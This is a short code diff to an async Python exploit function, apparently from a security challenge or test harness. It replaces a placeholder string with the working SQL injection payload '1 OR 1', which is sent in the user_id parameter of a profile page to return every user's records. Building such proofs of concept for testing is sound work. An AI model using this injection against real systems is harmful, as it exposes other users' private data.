@@ -271,7 +271,7 @@ async def exploit(
     await signup(client, user_name, password)
 
     # SQL Injection payload, returning all records regardless of the user_id.
-    SQL_INJECTION_PAYLOAD = "746a759a17e08411460812f472483104"
+    SQL_INJECTION_PAYLOAD = "1 OR 1"
     exploit_url = f"/my_profile.php?user_id={SQL_INJECTION_PAYLOAD}"
 
     response = await client.get(exploit_url)
